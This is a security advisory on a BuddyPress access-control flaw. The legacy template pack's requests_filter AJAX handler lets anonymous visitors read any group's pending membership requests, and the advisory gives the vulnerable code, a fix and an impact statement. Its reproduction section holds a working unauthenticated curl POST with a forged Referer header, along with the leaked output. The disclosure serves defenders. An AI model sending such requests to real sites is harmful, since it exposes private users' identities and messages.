## TL;DR
Viewing who has asked to join a private BuddyPress group is supposed to be admin-only. The legacy template pack's AJAX handler for that screen is registered for logged-out visitors too, and its entire body is two lines that render the requests list — no login check, no capability check, no nonce. The only input it reads is the `Referer` header. Anyone on the internet can read the full pending membership list, including requesters' identities and private join-request messages, for any group on the site.

**No account. No cookies. One POST. Full membership request list.**

## Environment
| Component | Version |
|---|---|
| WordPress | 7.1.2 |
| BuddyPress | 14.5.2 (exact zip reviewed: https://downloads.wordpress.org/plugin/buddypress.14.5.2.zip) |
| PHP | 8.4.24 (cli) |
| MariaDB | 11.8.8-MariaDB (Debian) |

## Description
Reviewing who has asked to join a private group is meant to be an admin-only action. The legacy template pack's AJAX handler for that screen is registered to run for logged-out visitors as well as logged-in users, and its entire body is two lines that render the requests list with no login check, no capability check, and no nonce — the group context comes solely from the `Referer` header the client sends along with the request.

## Root Cause

- File: `bp-templates/bp-legacy/buddypress-functions.php:916-919`
- Vulnerable code:

```php
function bp_legacy_theme_requests_template_loader() {
    bp_get_template_part( 'groups/single/requests-loop' );
    exit();
}
```

Registered at `buddypress-functions.php:139,186-188` (`'requests_filter' => 'bp_legacy_theme_requests_template_loader'`, hooked to both `wp_ajax_requests_filter` and `wp_ajax_nopriv_requests_filter`).

- Why it's wrong: the function performs no authentication or authorization check whatsoever before rendering a group's membership-request list, which is otherwise only reachable from an admin-gated screen.

## Steps to Reproduce

**Privilege level:** none — this request needs no account at all.

---

**Step 1 — Find the target group slug**

Private groups are listed in the public groups directory; only their content is hidden. The attacker reads the group slug directly from that directory.

---

**Step 2 — Send a single unauthenticated POST**

Seed data: `bystander` had submitted a pending membership request to "Private Council" (a private-status group) with the comment "please let me in".

```bash
curl -s -X POST \
  -H "Referer: http://127.0.0.1:8977/groups/private-council/" \
  "http://127.0.0.1:8977/wp-admin/admin-ajax.php" \
  --data "action=requests_filter"
```

```html
<div class="pag-count" id="group-mem-requests-count-top">
    Viewing 1 request
</div>
<ul id="request-list" class="item-list">
    <li class="item-list group-request-list">
        <div class="item-title"><a href="http://127.0.0.1:8977/members/bystander/">bystander</a></div>
        <span class="activity">requested 3 minutes ago</span>
        <p class="comments">please let me in</p>
    </li>
</ul>
```

A completely anonymous, cookie-less request returns the requester's identity, profile link, and private request comment for a group the caller has no relationship to whatsoever.

> **Note:** pointing `Referer` at the group's `/admin/membership-requests/` sub-path instead triggers an unrelated login redirect — a separate BuddyPress nav-level access gate applies specifically to the `admin` sub-nav slug. The plain group URL bypasses that gate entirely while still resolving the same underlying group context for this handler.

## Recommendation
Add `is_user_logged_in()` and `bp_is_item_admin() || bp_is_item_mod() || bp_current_user_can( 'bp_moderate' )` checks to `bp_legacy_theme_requests_template_loader()` before rendering, and remove the `wp_ajax_nopriv_requests_filter` registration entirely.

## Impact
Anyone on the internet, with no account and no cookies, can read the list of pending membership requests — including requesters' identities and private join-request messages — for any group on the site, including groups whose entire purpose is to keep membership confidential. No admin cooperation or authentication of any kind is needed.

### **Note: This issue was reported via HackerOne and marked as a duplicate of a prior report — meaning it was already known to the maintainers at the time of submission.**
